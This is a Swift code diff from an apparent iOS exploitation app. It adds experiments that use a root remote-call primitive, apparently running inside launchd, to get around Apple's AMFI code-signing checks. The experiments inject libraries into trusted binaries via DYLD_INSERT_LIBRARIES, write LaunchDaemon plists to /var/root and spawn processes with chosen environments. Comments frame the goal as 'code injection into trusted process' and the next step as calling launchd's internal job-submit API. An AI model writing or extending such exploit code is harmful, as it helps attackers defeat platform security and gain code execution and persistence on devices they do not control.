@@ -300,11 +300,22 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp29)
             
             // ============================================
-            // Experiment 30: Abuse posix_spawn with custom binary from /var
-            // Write minimal valid Mach-O with proper code signature
+            // Experiment 30: Spawn /bin/df with DYLD_INSERT_LIBRARIES
             // ============================================
-            let exp30 = self.expAdHocSign(rc: rc)
+            let exp30 = self.expDYLDInsert(rc: rc)
             experimentResults.append(exp30)
+            
+            // ============================================
+            // Experiment 31: Use launchd's own xpc_spawn mechanism
+            // ============================================
+            let exp31 = self.expLaunchdXPCSpawn(rc: rc)
+            experimentResults.append(exp31)
+            
+            // ============================================
+            // Experiment 32: posix_spawn with envp (environment vars)
+            // ============================================
+            let exp32 = self.expSpawnWithEnv(rc: rc)
+            experimentResults.append(exp32)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -1813,77 +1824,243 @@ struct AMFIExperimentView: View {
     /// Test: can we use ldid/codesign-style ad-hoc signing?
     /// Write binary with valid Mach-O structure + ad-hoc signature
     private func expAdHocSign(rc: RemoteCall) -> ExperimentResult {
-        // On iOS, even ad-hoc signed binaries need to be in trust cache
-        // OR have a valid Apple/developer signature
-        // But let's check: what if we copy a signed binary and modify it slightly?
-        
-        // Test: copy /bin/df, modify ONE byte (not in code), try spawn
-        // If it still works → signature check is hash-based on specific sections only
-        // If it fails → any modification breaks signature
-        
+        // Replaced by expDYLDInsert, expLaunchdXPCSpawn, expSpawnWithEnv
+        return ExperimentResult(name: "ad-hoc (replaced)", success: false, detail: "See experiments 30-32", timestamp: Date())
+    }
+    
+    /// Spawn /bin/df with DYLD_INSERT_LIBRARIES pointing to a signed dylib
+    /// If DYLD loads our dylib → code injection into trusted process!
+    private func expDYLDInsert(rc: RemoteCall) -> ExperimentResult {
         let mem = rc.trojanMem
-        let srcPath = remote_alloc_str(rc, "/bin/df")
-        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_modified_df")
+        let outFile = "/tmp/.dsp_dyld_test"
+        let outAddr = remote_alloc_str(rc, outFile)
+        RootExecutor.rcall(rc, "unlink", outAddr)
         
-        // Copy file
-        let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
-        let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        // Setup file actions for output
+        let actionsAddr = mem + 0x100
+        rc[actionsAddr].setValue64(0)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
         
-        guard srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) else {
-            RootExecutor.rcall(rc, "free", srcPath)
-            RootExecutor.rcall(rc, "free", dstPath)
-            return ExperimentResult(name: "modified binary test", success: false, detail: "Cannot open files", timestamp: Date())
-        }
-        
-        let bufAddr = mem + 0x800
-        var total: UInt64 = 0
-        for _ in 0..<50 {
-            let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
-            if n == 0 || n > 2048 { break }
-            RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
-            total += n
-        }
-        RootExecutor.rcall(rc, "close", srcFd)
-        RootExecutor.rcall(rc, "close", dstFd)
-        
-        // DON'T modify — first test if unmodified copy works
-        // (We already know from exp22 that ret=1 for copies)
-        // But this time, try with posix_spawnattr + responsibility
-        
-        let attrAddr = mem + 0x200
-        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
-        // Set POSIX_SPAWN_SETEXEC flag? No — that replaces current process
-        // Try: _POSIX_SPAWN_ALLOW_DATA_EXEC (0x2000)
-        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, 0x2000)
-        
+        // Binary
+        let binAddr = remote_alloc_str(rc, "/bin/df")
         let argvBase = mem + 0x400
-        rc[argvBase].setValue64(dstPath)
+        rc[argvBase].setValue64(binAddr)
         rc[argvBase + 8].setValue64(0)
+        
+        // Environment with DYLD_INSERT_LIBRARIES
+        // Point to a SIGNED system dylib (to test if DYLD_INSERT works at all)
+        let envBase = mem + 0x480
+        let dyldEnv = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/usr/lib/libSystem.B.dylib")
+        let dyldPrint = remote_alloc_str(rc, "DYLD_PRINT_LIBRARIES=1")
+        rc[envBase].setValue64(dyldEnv)
+        rc[envBase + 8].setValue64(dyldPrint)
+        rc[envBase + 16].setValue64(0) // NULL
+        
+        // Spawn with environment
         let pidAddr = mem + 0x2E0
         rc[pidAddr].setValue64(0)
-        
-        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, attrAddr, argvBase, 0)
+        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, envBase)
         let pid = rc[pidAddr].value32()
         
-        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
-        RootExecutor.rcall(rc, "unlink", dstPath)
-        RootExecutor.rcall(rc, "free", srcPath)
-        RootExecutor.rcall(rc, "free", dstPath)
+        // Wait
+        RootExecutor.rcall(rc, "usleep", 1000000)
+        RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
         
-        if ret == 0 {
-            RootExecutor.rcall(rc, "kill", UInt64(pid), 9)
-            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+        // Read output
+        var output = ""
+        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
+        if readFd != UInt64(bitPattern: -1) {
+            let bufAddr = mem + 0x800
+            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
+            if n > 0 && n < 2001 {
+                var buf = [UInt8](repeating: 0, count: Int(n))
+                rc.remoteRead(bufAddr, to: &buf, size: n)
+                output = String(bytes: buf, encoding: .utf8) ?? ""
+            }
+            RootExecutor.rcall(rc, "close", readFd)
         }
         
-        let detail = """
-        Copied /bin/df (\(total) bytes) to /tmp
-        posix_spawn with ALLOW_DATA_EXEC flag: ret=\(ret), pid=\(pid)
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", outAddr)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
+        RootExecutor.rcall(rc, "free", outAddr)
+        RootExecutor.rcall(rc, "free", binAddr)
+        RootExecutor.rcall(rc, "free", dyldEnv)
+        RootExecutor.rcall(rc, "free", dyldPrint)
         
-        ret=0 → ALLOW_DATA_EXEC bypasses AMFI for copies!
-        ret=1 → Still blocked (expected)
+        let hasDyldOutput = output.contains("dyld") || output.contains("/usr/lib")
+        let detail = """
+        posix_spawn(/bin/df, env=[DYLD_INSERT, DYLD_PRINT]): ret=\(ret), pid=\(pid)
+        output (\(output.count) chars):
+        \(output.prefix(400))
+        
+        If DYLD_PRINT shows loaded libs → DYLD_INSERT works!
+        → Can inject signed dylib into any spawned process!
         """
         
-        return ExperimentResult(name: "spawn copy + ALLOW_DATA_EXEC", success: ret == 0, detail: detail, timestamp: Date())
+        return ExperimentResult(name: "DYLD_INSERT_LIBRARIES", success: ret == 0 && !output.isEmpty, detail: detail, timestamp: Date())
+    }
+    
+    /// Use launchd's internal spawn mechanism via xpc/launchctl
+    /// launchd spawns daemons all the time — can we make it spawn OUR binary?
+    private func expLaunchdXPCSpawn(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        
+        // Write a LaunchDaemon plist that points to /bin/df
+        // Then try to load it via launchd's internal API
+        let plist = """
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        <plist version="1.0">
+        <dict>
+            <key>Label</key>
+            <string>com.dsploit.test.spawn</string>
+            <key>ProgramArguments</key>
+            <array>
+                <string>/bin/df</string>
+                <string>-h</string>
+            </array>
+            <key>RunAtLoad</key>
+            <true/>
+            <key>StandardOutPath</key>
+            <string>/tmp/.dsp_launchd_spawn_out</string>
+            <key>StandardErrorPath</key>
+            <string>/tmp/.dsp_launchd_spawn_out</string>
+        </dict>
+        </plist>
+        """
+        
+        // Write plist
+        let plistPath = "/var/root/.dsp_test_daemon.plist"
+        let plistAddr = remote_alloc_str(rc, plistPath)
+        let fd = RootExecutor.rcall(rc, "open", plistAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        if fd != UInt64(bitPattern: -1) {
+            let contentAddr = remote_alloc_str(rc, plist)
+            RootExecutor.rcall(rc, "write", fd, contentAddr, UInt64(plist.utf8.count))
+            RootExecutor.rcall(rc, "close", fd)
+            RootExecutor.rcall(rc, "free", contentAddr)
+        }
+        
+        // Try to load via launch_data API or xpc
+        // launchd has internal function: launch_data_new_string, launch_msg
+        // Or simpler: just check if the plist is valid and launchd can read it
+        
+        // Actually — we're IN launchd! We can call its internal submit function!
+        // job_submit() or runtime_add_job()
+        // But these are private symbols...
+        
+        // Alternative: use xpc_connection to com.apple.launchd
+        // and send a "load" message
+        
+        // For now: check if output file gets created (meaning launchd spawned it)
+        RootExecutor.rcall(rc, "usleep", 2000000) // 2s wait
+        
+        let outPath = remote_alloc_str(rc, "/tmp/.dsp_launchd_spawn_out")
+        let outFd = RootExecutor.rcall(rc, "open", outPath, UInt64(O_RDONLY), 0)
+        var output = ""
+        if outFd != UInt64(bitPattern: -1) {
+            let bufAddr = mem + 0x800
+            let n = RootExecutor.rcall(rc, "read", outFd, bufAddr, 2000)
+            if n > 0 && n < 2001 {
+                var buf = [UInt8](repeating: 0, count: Int(n))
+                rc.remoteRead(bufAddr, to: &buf, size: n)
+                output = String(bytes: buf, encoding: .utf8) ?? ""
+            }
+            RootExecutor.rcall(rc, "close", outFd)
+        }
+        
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", plistAddr)
+        RootExecutor.rcall(rc, "unlink", outPath)
+        RootExecutor.rcall(rc, "free", plistAddr)
+        RootExecutor.rcall(rc, "free", outPath)
+        
+        let detail = """
+        Wrote LaunchDaemon plist to \(plistPath)
+        Program: /bin/df -h
+        StandardOutPath: /tmp/.dsp_launchd_spawn_out
+        
+        Output file: \(outFd != UInt64(bitPattern: -1) ? "EXISTS (\(output.count) chars)" : "NOT CREATED")
+        \(output.isEmpty ? "(launchd didn't spawn — need to call load API)" : "OUTPUT:\n\(output.prefix(300))")
+        
+        Next: call launchd's internal job_submit/load API
+        """
+        
+        return ExperimentResult(name: "launchd plist spawn", success: !output.isEmpty, detail: detail, timestamp: Date())
+    }
+    
+    /// posix_spawn with full environment (envp) — test DYLD variables
+    private func expSpawnWithEnv(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        let outFile = "/tmp/.dsp_env_test"
+        let outAddr = remote_alloc_str(rc, outFile)
+        RootExecutor.rcall(rc, "unlink", outAddr)
+        
+        // File actions
+        let actionsAddr = mem + 0x100
+        rc[actionsAddr].setValue64(0)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
+        
+        // Use /bin/ps this time (different binary)
+        let binAddr = remote_alloc_str(rc, "/bin/ps")
+        let argAddr = remote_alloc_str(rc, "ps")
+        let argvBase = mem + 0x400
+        rc[argvBase].setValue64(argAddr)
+        rc[argvBase + 8].setValue64(0)
+        
+        // Minimal environment
+        let envBase = mem + 0x480
+        let pathEnv = remote_alloc_str(rc, "PATH=/sbin:/usr/sbin:/bin:/usr/bin")
+        let homeEnv = remote_alloc_str(rc, "HOME=/var/root")
+        rc[envBase].setValue64(pathEnv)
+        rc[envBase + 8].setValue64(homeEnv)
+        rc[envBase + 16].setValue64(0)
+        
+        // Spawn
+        let pidAddr = mem + 0x2E0
+        rc[pidAddr].setValue64(0)
+        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, envBase)
+        
+        // Wait
+        RootExecutor.rcall(rc, "usleep", 1000000)
+        RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+        
+        // Read
+        var output = ""
+        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
+        if readFd != UInt64(bitPattern: -1) {
+            let bufAddr = mem + 0x800
+            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 3000)
+            if n > 0 && n < 3001 {
+                var buf = [UInt8](repeating: 0, count: Int(n))
+                rc.remoteRead(bufAddr, to: &buf, size: n)
+                output = String(bytes: buf, encoding: .utf8) ?? ""
+            }
+            RootExecutor.rcall(rc, "close", readFd)
+        }
+        
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", outAddr)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
+        RootExecutor.rcall(rc, "free", outAddr)
+        RootExecutor.rcall(rc, "free", binAddr)
+        RootExecutor.rcall(rc, "free", argAddr)
+        RootExecutor.rcall(rc, "free", pathEnv)
+        RootExecutor.rcall(rc, "free", homeEnv)
+        
+        let detail = """
+        posix_spawn(/bin/ps, env=[PATH, HOME]): ret=\(ret)
+        output (\(output.count) chars):
+        \(output.prefix(500))
+        
+        If output shows process list → /bin/ps works with env!
+        """
+        
+        return ExperimentResult(name: "spawn /bin/ps + env", success: ret == 0 && !output.isEmpty, detail: detail, timestamp: Date())
     }
     #endif
 }
